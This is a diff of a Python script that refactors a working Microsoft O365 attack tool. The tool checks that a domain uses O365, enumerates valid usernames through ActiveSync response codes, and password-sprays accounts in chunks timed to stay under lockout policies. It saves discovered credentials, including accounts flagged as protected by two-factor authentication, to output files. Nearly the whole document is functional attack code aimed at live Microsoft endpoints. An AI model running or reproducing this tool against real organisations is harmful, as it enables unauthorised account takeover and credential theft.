@@ -1,15 +1,16 @@
 #!/usr/bin/env python3
 
+# TODO: Support single username and/or single password
+# Based on the research from grimhacker:
+#   https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/
+#   https://bitbucket.org/grimhacker/office365userenum/src/master/
+
 # -------------------------------
 __author__  = "km-zdh"
 __date__    = "August 7, 2019"
-__version__ = "1.0"
+__version__ = "1.1"
 # -------------------------------
 """A basic username enumeration and password spraying tool aimed at spraying Microsoft O365."""
-
-# Based on the research from grimhacker:
-# https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/
-# https://bitbucket.org/grimhacker/office365userenum/src/master/
 
 from re import sub, search
 from time import sleep, time
@@ -25,59 +26,34 @@ disable_warnings(InsecureRequestWarning)
 
 # Global variables
 MAX_THREADS = 10
-VALIDATE_DOMAIN_URL = "https://login.microsoftonline.com/getuserrealm.srf?login=user@{DOMAIN}&xml=1"
-SPRAY_URL = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
-SPRAY_CODES = {
-  200: "VALID_CREDS",
-  401: "BAD_PASSWD",
-  403: "VALID_CREDS_2FA",
-  404: "INVALID_USER"
-}
 
-valid_creds = {}
-valid_accts = []
+# Global storage for valid account data
+valid_creds = {} # Password spray storage
+valid_accts = [] # User enumeration storage
 
 
-# Colorized output during run
+
 class text_colors:
+  """ Colorized output during run """
   red    = "\033[91m"
   green  = "\033[92m"
   yellow = "\033[93m"
   reset  = "\033[0m"
 
 
-# Helper functions
+
 class Helper:
+  """ Helper functions """
 
-  def enum_stats(self, creds):
-    print("\n%s\n[*] User Enumeration Stats\n%s" % ("="*26, "="*26))   
+  def print_stats(self, type_, creds, filename):
+    print("\n%s\n[*] %s\n%s" % ("="*(len(type_)+4), type_, "="*(len(type_)+4)))
     print("[*] Valid Accounts: %d" % len(creds))
     if len(creds) > 0:
-      print("[+] Writing valid usernames to the file: valid_users.txt...")
-      with open("valid_users.txt", 'w') as file_:
-        for user in creds:
-          file_.write("%s\n" % user)
-
-  def spray_stats(self, creds):
-    print("\n%s\n[*] Password Spraying Stats\n%s" % ("="*27, "="*27))   
-    print("[*] Valid Accounts: %d" % len(creds))
-    if len(creds) > 0:
-      print("[+] Writing valid credentials to the file: valid_creds.txt...")
-      with open("valid_creds.txt", 'w') as file_:
-        for user in creds.keys():
-          file_.write("%s\n" % ("%s:%s" % (user, creds[user])))
-
-  def get_domain_from_list(self, email_list):
-    domains = set()
-    for email in email_list:
-      domain = search("@([\w.]+)", email)
-      domains.add(domain.group(1))
-
-    return domains
-
-  def loop_dict(self, dict_):
-    for key in dict_.keys():
-      yield key
+      print("[+] Writing data to: %s..." % filename)
+      if type(creds) == dict: creds = ['%s:%s' % (k, v) for k, v in creds.items()]
+      with open(filename, 'w') as file_:
+        for account in creds:
+          file_.write("%s\n" % account)
 
   def get_chunks_from_list(self, list_, n):
     for i in range(0, len(list_), n):
@@ -99,113 +75,161 @@ class Helper:
     sleep(lockout * 60)
 
 
-# Sprayer class to handle domain validation, user enum and password spraying
-class Sprayer:
 
-  loop = get_event_loop()
+class Validator:
+  """ This is to validate the target domain is using O365 """
 
-  def __init__(self, proxy, threads):
-    self.helper = Helper()
-    self.proxy = None if not proxy else {
-      "http"  : "http://%s" % sub('^http://', '', proxy),
-      "https" : "https://%s" % sub('^https://', '', proxy)
+  default_url = "https://login.microsoftonline.com/getuserrealm.srf?login=user@{DOMAIN}&xml=1"
+
+  def __init__(self, domain, proxy=None, debug=False):
+    self.domain = domain
+    self.url    = self.default_url.format(DOMAIN=self.domain)
+    self.debug  = debug
+    self.proxy  = None if not proxy else {
+      "http": proxy, "https": proxy
     }
-    self.executor = ThreadPoolExecutor(max_workers=threads)
 
-
-  def validate_domain(self, domain):
-    """ This is to validate the target domain is using O365 """
+  def run(self):
     try:
-      rsp = get(VALIDATE_DOMAIN_URL.format(DOMAIN=domain), proxies=self.proxy, verify=False)
+      rsp = get(self.url, proxies=self.proxy, verify=False)
       xml = fromstring(rsp.text)
       nst = xml.find('NameSpaceType').text
 
       if nst in ["Managed", "Federated"]:
-        print("[%sVALID%s] The following domain is using O365: %s" % (text_colors.green, text_colors.reset, domain))
+        print("[%sVALID%s] The following domain is using O365: %s" % (text_colors.green, text_colors.reset, self.domain))
 
       else:
-        print("[%sINVALID%s] The following domain is not using O365: %s" % (text_colors.red, text_colors.reset, domain))
+        print("[%sINVALID%s] The following domain is not using O365: %s" % (text_colors.red, text_colors.reset, self.domain))
 
     except Exception as e:
-      if debug: print(e)
+      if self.debug: print(e)
       pass
 
 
-  async def loop_requests(self, user_list, password_chunk, enum, debug):
+
+class Enumerator:
+  """ Perform user enumeration using Microsoft Server ActiveSync """
+
+  loop = get_event_loop()
+
+  default_base = "outlook.office365.com"
+  default_url  = "https://{BASE}/Microsoft-Server-ActiveSync"
+
+  def __init__(self, user_file, url_base=None, proxy=None, debug=False, threads=MAX_THREADS):
+    url_base   = self.default_base if not url_base else url_base
+    self.url   = self.default_url.format(BASE=url_base)
+    self.debug = debug
+    self.proxy = None if not proxy else {
+      "http": proxy, "https": proxy
+    }
+    self.file_ = user_file
+    self.helper   = Helper()
+    self.executor = ThreadPoolExecutor(max_workers=threads)
+
+  async def run(self):
     """ Asynchronously send HTTP requests """
-    if not enum:
-      futures = [self.loop.run_in_executor(
-      self.executor, self.spray, user, password, debug
-      ) for user in user_list for password in password_chunk]
-    
-    else:
-      futures = [self.loop.run_in_executor(
-      self.executor, self.enum, user, "Password1", debug
-      ) for user in user_list]
+    futures = [self.loop.run_in_executor(
+      self.executor, self.enum, user
+    ) for user in self.helper.get_list_from_file(self.file_)]
 
     await wait(futures)
 
-
-  def enum(self, user, password, debug=False):
+  def enum(self, user):
     """ Enumerate users on Microsoft using Microsoft Server ActiveSync """
+    password = "Password1"
     try:
       headers = {"MS-ASProtocolVersion": "14.0"}
       auth = (user, password)
-      rsp = options(SPRAY_URL, headers=headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)
+      rsp  = options(self.url, headers=headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)
 
       status = rsp.status_code
       if status in [200, 401, 403]:
-        print("[%s%s%s] %s:%s" % (text_colors.green, "VALID_USER", text_colors.reset, user, password))
+        print("[%s%s-%d%s] %s:%s" % (text_colors.green, "VALID_USER", status, text_colors.reset, user, password))
         valid_accts.append(user)
 
       elif status == 404 and rsp.headers.get("X-CasErrorCode") == "UserNotFound":
-        print("[%s%s%s] %s:%s" % (text_colors.red, SPRAY_CODES[status], text_colors.reset, user, password))
+        print("[%s%s%s] %s:%s" % (text_colors.red, "INVALID_USER", text_colors.reset, user, password))
 
       else:
         print("[%s%s%s] %s:%s" % (text_colors.yellow, "UNKNOWN", text_colors.reset, user, password))
 
     except Exception as e:
-      if debug: print("[ERROR] %s" % e)
+      if self.debug: print("[ERROR] %s" % e)
       pass
 
 
-  def spray(self, user, password, debug=False):
+
+class Sprayer:
+  """ Perform password spraying using Microsoft Server ActiveSync """
+
+  loop = get_event_loop()
+
+  default_base = "outlook.office365.com"
+  default_url  = "https://{BASE}/Microsoft-Server-ActiveSync"
+  codes = {
+    200: "VALID_CREDS",
+    401: "BAD_PASSWD",
+    403: "VALID_CREDS_2FA",
+    404: "INVALID_USER"
+  }
+
+  def __init__(self, user_file, url_base=None, proxy=None, debug=False, threads=MAX_THREADS):
+    url_base   = self.default_base if not url_base else url_base
+    self.url   = self.default_url.format(BASE=url_base)
+    self.debug = debug
+    self.proxy = None if not proxy else {
+      "http": proxy, "https": proxy
+    }
+    self.helper   = Helper()
+    self.executor = ThreadPoolExecutor(max_workers=threads)
+    self.user_list = self.helper.get_list_from_file(user_file)
+
+  async def run(self, password_chunk):
+    """ Asynchronously send HTTP requests """
+    futures = [self.loop.run_in_executor(
+      self.executor, self.spray, user, password
+    ) for user in self.user_list for password in password_chunk]
+
+    await wait(futures)
+
+  def spray(self, user, password):
     """ Password spray Microsoft using Microsoft Server ActiveSync """
     try:
       headers = {"MS-ASProtocolVersion": "14.0"}
       auth = (user, password)
-      rsp = options(SPRAY_URL, headers=headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)
+      rsp  = options(self.url, headers=headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)
 
       status = rsp.status_code
       if status in [200, 403]:
-        print("[%s%s%s] %s:%s" % (text_colors.green, SPRAY_CODES[status], text_colors.reset, user, password))
+        print("[%s%s%s] %s:%s" % (text_colors.green, self.codes[status], text_colors.reset, user, password))
         valid_creds[user] = password
 
       elif status == 401:
-        print("[%s%s%s] %s:%s" % (text_colors.yellow, SPRAY_CODES[status], text_colors.reset, user, password))
+        print("[%s%s%s] %s:%s" % (text_colors.yellow, self.codes[status], text_colors.reset, user, password))
 
       elif status == 404 and rsp.headers.get("X-CasErrorCode") == "UserNotFound":
-        print("[%s%s%s] %s:%s" % (text_colors.red, SPRAY_CODES[status], text_colors.reset, user, password))
+        print("[%s%s%s] %s:%s" % (text_colors.red, self.codes[status], text_colors.reset, user, password))
 
       else:
         print("[%s%s%s] %s:%s" % (text_colors.yellow, "UNKNOWN", text_colors.reset, user, password))
 
     except Exception as e:
-      if debug: print("[ERROR] %s" % e)
+      if self.debug: print("[ERROR] %s" % e)
       pass
 
 
 
 if __name__ == "__main__":
   parser = ArgumentParser(description="Microsoft O365 User Enumerator and Password Sprayer.")
-  parser.add_argument("-u", "--username", type=str, help="File containing list of usernames", required=False)
-  parser.add_argument("-p", "--password", type=str, help="File containing list of passwords", required=False)
-  parser.add_argument("--proxy", type=str, help="Proxy to pass traffic through: <ip:port>", required=False)
-  parser.add_argument("--count", type=int, help="Number of password attempts to run before resetting lockout timer", required=False)
-  parser.add_argument("--lockout", type=float, help="Lockout policy reset time (in minutes)", required=False)
-  parser.add_argument("--domain", type=str, help="Domain name to validate against O365", required=False)
-  parser.add_argument("--threads", type=int, help="Number of threads to run. Default: 10", default=MAX_THREADS, required=False)
-  parser.add_argument("--debug", action="store_true", help="Debug output", required=False)
+  parser.add_argument("-u", "--username", type=str, help="File containing list of usernames")
+  parser.add_argument("-p", "--password", type=str, help="File containing list of passwords")
+  parser.add_argument("--count", type=int, help="Number of password attempts to run before resetting lockout timer")
+  parser.add_argument("--lockout", type=float, help="Lockout policy reset time (in minutes)")
+  parser.add_argument("--domain", type=str, help="Domain name to validate against O365")
+  parser.add_argument("--proxy", type=str, help="Proxy to pass traffic through: <ip:port>")
+  parser.add_argument("--threads", type=int, help="Number of threads to run. Default: 10", default=MAX_THREADS)
+  parser.add_argument("--output", type=str, help="Output file name for enumeration and spraying")
+  parser.add_argument("--debug", action="store_true", help="Debug output")
 
   group = parser.add_mutually_exclusive_group(required=True)
 
@@ -237,37 +261,32 @@ if __name__ == "__main__":
           " password count [--count], and lockout timer in minutes [--lockout].")
       exit(1)
 
-  helper = Helper()
-
   start = time()
+  helper = Helper()
 
   # Perform domain validation
   if args.validate:
-    validator = Sprayer(args.proxy, args.threads)
-    validator.validate_domain(args.domain)
-
+    validator = Validator(args.domain, args.proxy, args.debug)
+    validator.run()
 
   # Perform user enumeration
   elif args.enum:
-    user_list = helper.get_list_from_file(args.username)
-    enum = Sprayer(args.proxy, args.threads)
-    enum.loop.run_until_complete(enum.loop_requests(user_list, None, True, args.debug))
-    helper.enum_stats(valid_accts)
-
+    enum = Enumerator(args.username, args.domain, args.proxy, args.debug, args.threads)
+    enum.loop.run_until_complete(enum.run())
+    helper.print_stats("User Enumeration", valid_accts, ("valid_users.txt" if not args.output else args.output))
 
   # Perform password spray
   elif args.spray:
-    user_list = helper.get_list_from_file(args.username)
-    spray = Sprayer(args.proxy, args.threads)
+    spray = Sprayer(args.username, args.domain, args.proxy, args.debug, args.threads)
+    
     password_list = helper.get_list_from_file(args.password)
     for password_chunk in helper.get_chunks_from_list(password_list, args.count):
       print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
-      spray.loop.run_until_complete(spray.loop_requests(user_list, password_chunk, False, args.debug))
+      spray.loop.run_until_complete(spray.run(password_chunk))
       if not helper.check_last_chunk(password_chunk, password_list):
         helper.lockout_reset_wait(args.lockout)
 
-    helper.spray_stats(valid_creds)
-
+    helper.print_stats("Password Spraying", valid_creds, ("valid_credentials.txt" if not args.output else args.output))
 
   elapsed = time() - start
-  if args.debug: print("\n[*] %s executed in %0.2f seconds." % (__file__, elapsed))
+  if args.debug: print("\n>> %s executed in %0.2f seconds." % (__file__, elapsed))
